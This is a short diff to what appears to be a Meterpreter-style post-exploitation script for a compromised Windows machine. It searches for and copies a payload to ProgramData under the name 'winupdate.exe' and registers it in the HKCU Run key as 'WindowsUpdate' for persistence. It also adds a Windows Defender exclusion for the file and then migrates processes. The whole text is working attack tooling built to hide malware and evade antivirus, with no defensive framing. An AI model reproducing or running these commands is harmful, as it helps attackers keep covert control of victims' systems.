@@ -1,4 +1,5 @@
-execute -f cmd.exe -H -i -c -a "/c copy %TEMP%\\payload.exe %ProgramData%\\winupdate.exe"
-execute -f cmd.exe -H -i -c -a "/c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /d \"%ProgramData%\\winupdate.exe\" /f"
-execute -f powershell.exe -H -i -c -a "Add-MpPreference -ExclusionPath \"$env:ProgramData\\winupdate.exe\""
+shell for /r C:\ %i in (output.exe) do @set FOUND=%i
+shell copy "%FOUND%" "C:\ProgramData\winupdate.exe"
+execute -f cmd.exe -H -i -c -a "/c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /d \"C:\ProgramData\winupdate.exe\" /f"
+execute -f powershell.exe -H -i -c -a "Add-MpPreference -ExclusionPath 'C:\ProgramData\winupdate.exe'"
 migrate -f
